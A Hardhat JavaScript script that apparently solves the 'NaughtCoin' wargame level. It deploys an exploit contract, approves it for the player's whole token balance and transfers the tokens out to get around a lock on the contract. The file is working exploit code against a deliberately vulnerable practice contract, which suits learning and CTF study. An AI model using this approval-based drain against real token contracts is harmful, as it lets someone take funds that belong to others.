// naughtCoin.js - Exploits the NaughtCoin contract

// Import statements
require("dotenv").config();
const { ethers } = require("hardhat");
const { naughtCoinAddress, naughtCoinAbi } = require("../contracts");

async function main() {
    // Get ethers signer and contract instances
    const provider = ethers.provider;
    const account = await ethers.getSigner();
    const naughtCoin = new ethers.Contract(naughtCoinAddress, naughtCoinAbi, provider);
    const naughtCoinSigner = naughtCoin.connect(account);

    // Deploy the Exploiter contract
    const Exploiter = await ethers.getContractFactory("NaughtCoinExploit");
    console.log("Deploying exploit...");
    const exploiter = await Exploiter.deploy(naughtCoin.address);
    await exploiter.deployed();
    console.log("Exploiter deployed to:", exploiter.address);

    // Approve the exploit contract for our balance of the naughtCoin token
    console.log("Approving exploiter for coins.")
    const approvalTxn = await naughtCoinSigner.approve(exploiter.address, ethers.utils.parseUnits("1000000", "ether"));
    await approvalTxn.wait();

    // Call the exploit
    console.log("Transfering coins with exploiter.")
    const xferTxn = await exploiter.transferCoins(ethers.utils.parseUnits("1000000", "ether"));
    await xferTxn.wait();   
    console.log("Exploit successful.");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });